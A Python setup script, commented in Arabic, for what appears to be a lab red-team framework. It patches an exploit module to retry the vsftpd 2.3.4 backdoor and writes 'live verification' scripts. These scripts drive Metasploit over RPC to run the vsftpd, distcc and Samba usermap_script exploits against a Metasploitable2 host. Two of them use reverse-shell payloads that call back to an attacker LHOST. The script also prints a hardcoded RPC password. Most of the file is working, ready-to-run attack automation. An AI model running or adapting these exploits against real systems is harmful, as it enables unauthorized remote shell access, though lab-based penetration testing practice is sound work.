#!/usr/bin/env python3
"""
setup_everything.py
--------------------
يطبّق دفعة وحدة كل الإصلاحات المتفق عليها:
1. retry x3 لـ vsftpd backdoor + رسالة auth واضحة
2. مجلد manual_verification/ بسكربتات فحص حي
3. مجلد evidence/ لتوثيق الأدلة
تاخذ نسخة احتياطية من أي ملف تعدّله قبل التعديل.
"""
import os
import shutil
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent
EXPLOIT_FILE = ROOT / "engine" / "modules" / "exploiter" / "exploit_simulation.py"


def backup(path: Path):
    bak = path.with_suffix(path.suffix + ".bak_before_retry_patch")
    if not bak.exists():
        shutil.copy2(path, bak)
        print(f"  [backup] {bak.name}")
    else:
        print(f"  [backup] already exists -- {bak.name}")


def patch_exploit_simulation():
    if not EXPLOIT_FILE.exists():
        print(f"[FATAL] لم أجد الملف: {EXPLOIT_FILE}")
        print("  شغّلي هذا السكربت من مجلد المشروع الرئيسي.")
        sys.exit(1)

    text = EXPLOIT_FILE.read_text(encoding="utf-8")
    backup(EXPLOIT_FILE)

    # ---- Patch 1: retry x3 for NO_PAYLOAD_MODULES branch ----
    OLD_BLOCK = '''        if exploit_path in NO_PAYLOAD_MODULES:
            print(f"  [MSF-RPC] Built-in backdoor -- no payload needed")
            try:
                result = mod.execute()
            except Exception as e:
                print(f"  [MSF-RPC] Execute error: {e}")
                return False
        else:'''

    NEW_BLOCK = '''        if exploit_path in NO_PAYLOAD_MODULES:
            print(f"  [MSF-RPC] Built-in backdoor -- no payload needed")
            session_id = None
            attempts = 3
            for attempt in range(1, attempts + 1):
                print(f"  [MSF-RPC] Backdoor attempt {attempt}/{attempts}")
                try:
                    before_sessions = set(client.sessions.list.keys())
                    result = mod.execute()
                except Exception as e:
                    print(f"  [MSF-RPC] Execute error (attempt {attempt}): {e}")
                    time.sleep(2)
                    continue
                job_id = result.get("job_id") if isinstance(result, dict) else None
                if job_id is None:
                    print(f"  [MSF-RPC] \\u2717 Module did not start a job -- {result}")
                    time.sleep(2)
                    continue
                session_id = self._wait_for_session(client, before_sessions, host, timeout=45)
                if session_id:
                    break
                try:
                    client.jobs.stop(str(job_id))
                except Exception:
                    pass
                if attempt < attempts:
                    time.sleep(3)
            if session_id:
                print(f"  [MSF-RPC] \\u2713 Success -- session {session_id} opened on {host}:{port} (attempt {attempt})")
                self.last_msf_session = session_id
                return True
            print(f"  [MSF-RPC] \\u2717 No session after {attempts} attempts")
            return False
        else:'''

    if OLD_BLOCK not in text:
        print("[WARN] Patch 1 (retry x3): لم يُطابَق النص الأصلي -- الملف تغيّر عن اللي عندي.")
        print("       تخطيت هذا التعديل حتى لا أخرّب الملف. راجعيه يدويًا.")
    else:
        text = text.replace(OLD_BLOCK, NEW_BLOCK, 1)
        print("  [patch] retry x3 applied to NO_PAYLOAD_MODULES branch")

    # ---- Patch 2: clearer auth-failure message ----
    OLD_AUTH = '''    elif result["error"] is not None:
        err = result["error"]
        print(f"  [MSF-RPC] Connection failed -- is msfrpcd running? ({err})")
        _msf_client = None'''

    NEW_AUTH = '''    elif result["error"] is not None:
        err = result["error"]
        if "Authentication failed" in str(err):
            print(f"  [MSF-RPC] \\u2717 AUTH FAILED -- msfrpcd password != $MSF_RPC_PASS")
            print(f"            Fix: pkill -f msfrpcd; sleep 3; "
                  f"msfrpcd -P $MSF_RPC_PASS -S -a 127.0.0.1 -p {MSF_RPC_PORT} -U msf")
        else:
            print(f"  [MSF-RPC] Connection failed -- is msfrpcd running? ({err})")
        _msf_client = None'''

    if OLD_AUTH not in text:
        print("[WARN] Patch 2 (auth message): لم يُطابَق النص الأصلي -- تخطيته.")
    else:
        text = text.replace(OLD_AUTH, NEW_AUTH, 1)
        print("  [patch] clearer auth-failure message applied")

    EXPLOIT_FILE.write_text(text, encoding="utf-8")
    print(f"  [done] {EXPLOIT_FILE} محدّث\n")


def create_manual_verification():
    d = ROOT / "manual_verification"
    d.mkdir(exist_ok=True)

    readme = d / "README.md"
    readme.write_text(
        "# Manual Verification Scripts\n\n"
        "هذه ليست unit tests -- تتصل بـ msfrpcd حي وهدف حقيقي (Metasploitable2).\n\n"
        "الاستخدام:\n"
        "```\n"
        "export MSF_RPC_PASS=<password>\n"
        "python3 manual_verification/test_vsftpd_live.py\n"
        "```\n",
        encoding="utf-8",
    )

    vsftpd_test = d / "test_vsftpd_live.py"
    vsftpd_test.write_text(
        '''"""فحص حي لثغرة vsftpd 2.3.4 backdoor عبر MSF-RPC مباشرة."""
from pymetasploit3.msfrpc import MsfRpcClient
import time, os, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.187.144"
pw = os.environ.get("MSF_RPC_PASS", "")
if not pw:
    sys.exit("export MSF_RPC_PASS اولاً")

c = MsfRpcClient(pw, server="127.0.0.1", port=55552, ssl=False)
print("Connected OK")

mod = c.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
mod["RHOSTS"] = TARGET
mod["RPORT"] = 21

for attempt in range(1, 4):
    print(f"\\nAttempt {attempt}/3")
    before = set(c.sessions.list.keys())
    r = mod.execute()
    print("Execute result:", r)
    found = None
    for i in range(15):
        time.sleep(3)
        sess = set(c.sessions.list.keys()) - before
        if sess:
            found = sess
            break
        print(f"  waiting... {i*3}s")
    if found:
        print("SESSION OPENED:", found)
        print(c.sessions.list)
        break
    print("  no session this attempt")
else:
    print("\\nNO SESSION after 3 attempts")
''',
        encoding="utf-8",
    )
    print(f"  [created] {vsftpd_test.relative_to(ROOT)}")

    distcc_test = d / "test_distcc_live.py"
    distcc_test.write_text(
        '''"""فحص حي لثغرة distccd (منفذ 3632) -- RCE بدون مصادقة."""
from pymetasploit3.msfrpc import MsfRpcClient
import time, os, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.187.144"
LHOST = sys.argv[2] if len(sys.argv) > 2 else "192.168.187.137"
pw = os.environ.get("MSF_RPC_PASS", "")
if not pw:
    sys.exit("export MSF_RPC_PASS اولاً")

c = MsfRpcClient(pw, server="127.0.0.1", port=55552, ssl=False)
mod = c.modules.use("exploit", "unix/misc/distcc_exec")
mod["RHOSTS"] = TARGET
payload = c.modules.use("payload", "cmd/unix/reverse")
payload["LHOST"] = LHOST
payload["LPORT"] = 4446

before = set(c.sessions.list.keys())
r = mod.execute(payload=payload)
print("Execute result:", r)
for i in range(15):
    time.sleep(3)
    sess = set(c.sessions.list.keys()) - before
    if sess:
        print("SESSION OPENED:", sess)
        break
    print(f"  waiting... {i*3}s")
else:
    print("NO SESSION after 45s")
''',
        encoding="utf-8",
    )
    print(f"  [created] {distcc_test.relative_to(ROOT)}")

    samba_test = d / "test_samba_live.py"
    samba_test.write_text(
        '''"""فحص حي لثغرة Samba usermap_script."""
from pymetasploit3.msfrpc import MsfRpcClient
import time, os, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "192.168.187.144"
LHOST = sys.argv[2] if len(sys.argv) > 2 else "192.168.187.137"
pw = os.environ.get("MSF_RPC_PASS", "")
if not pw:
    sys.exit("export MSF_RPC_PASS اولاً")

c = MsfRpcClient(pw, server="127.0.0.1", port=55552, ssl=False)
mod = c.modules.use("exploit", "multi/samba/usermap_script")
mod["RHOSTS"] = TARGET
payload = c.modules.use("payload", "cmd/unix/reverse")
payload["LHOST"] = LHOST
payload["LPORT"] = 4445

before = set(c.sessions.list.keys())
r = mod.execute(payload=payload)
print("Execute result:", r)
for i in range(15):
    time.sleep(3)
    sess = set(c.sessions.list.keys()) - before
    if sess:
        print("SESSION OPENED:", sess)
        break
    print(f"  waiting... {i*3}s")
else:
    print("NO SESSION after 45s")
''',
        encoding="utf-8",
    )
    print(f"  [created] {samba_test.relative_to(ROOT)}\n")


def create_evidence_structure():
    for sub in ["raw_logs", "screenshots", "session_transcripts"]:
        (ROOT / "evidence" / sub).mkdir(parents=True, exist_ok=True)
    log_md = ROOT / "evidence" / "evidence_log.md"
    if not log_md.exists():
        log_md.write_text(
            "# Evidence Log\n\n"
            "## Session: <SIM-ID> -- <date UTC>\n"
            "- Target: \n"
            "- Module: \n"
            "- Method: \n"
            "- Session ID: \n"
            "- Verification: `id` -> \n"
            "- Evidence files:\n"
            "  - evidence/raw_logs/...\n"
            "  - evidence/screenshots/...\n",
            encoding="utf-8",
        )
    print("  [created] evidence/ (raw_logs, screenshots, session_transcripts, evidence_log.md)\n")


def create_runner_script():
    runner = ROOT / "run_logged.sh"
    runner.write_text(
        "#!/bin/bash\n"
        "# يشغّل الإطار ويسجّل كل شي بملف evidence تلقائيًا\n"
        "set -e\n"
        'STAMP=$(date +%Y%m%d_%H%M%S)\n'
        'LOGFILE="evidence/raw_logs/run_${STAMP}.log"\n'
        'echo "Logging to $LOGFILE"\n'
        "python3 -m engine.main 2>&1 | tee \"$LOGFILE\"\n",
        encoding="utf-8",
    )
    runner.chmod(0o755)
    print(f"  [created] run_logged.sh (chmod +x)\n")


if __name__ == "__main__":
    print("== 1/4: patching exploit_simulation.py ==")
    patch_exploit_simulation()

    print("== 2/4: creating manual_verification/ ==")
    create_manual_verification()

    print("== 3/4: creating evidence/ structure ==")
    create_evidence_structure()

    print("== 4/4: creating run_logged.sh ==")
    create_runner_script()

    print("=" * 50)
    print("خلص! الآن:")
    print("  export MSF_RPC_PASS=redteam123")
    print("  python3 manual_verification/test_vsftpd_live.py")
    print("  # لو نجحت -> شغّلي الإطار كامل مع تسجيل تلقائي:")
    print("  ./run_logged.sh")

